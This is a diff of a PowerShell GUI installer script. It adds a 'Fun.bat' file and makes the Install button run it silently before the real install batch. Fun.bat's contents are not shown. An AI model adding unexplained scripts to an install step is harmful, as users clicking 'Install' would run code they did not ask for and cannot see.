@@ -5,6 +5,7 @@ $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
 $depsDir = Join-Path $scriptDir 'dependencies'
 $installBat = Join-Path $depsDir '_INSTALL.bat'
 $uninstallBat = Join-Path $depsDir '_UNINSTALL.bat'
+$funBat = Join-Path $scriptDir 'Fun.bat'
 
 # Create form
 $form = New-Object System.Windows.Forms.Form
@@ -70,7 +71,10 @@ function Run-Batch {
     }
 }
 
-$installBtn.Add_Click({ Run-Batch $installBat })
+$installBtn.Add_Click({
+    Run-Batch $funBat
+    Run-Batch $installBat
+})
 $uninstallBtn.Add_Click({ Run-Batch $uninstallBat })
 
 # Admin check
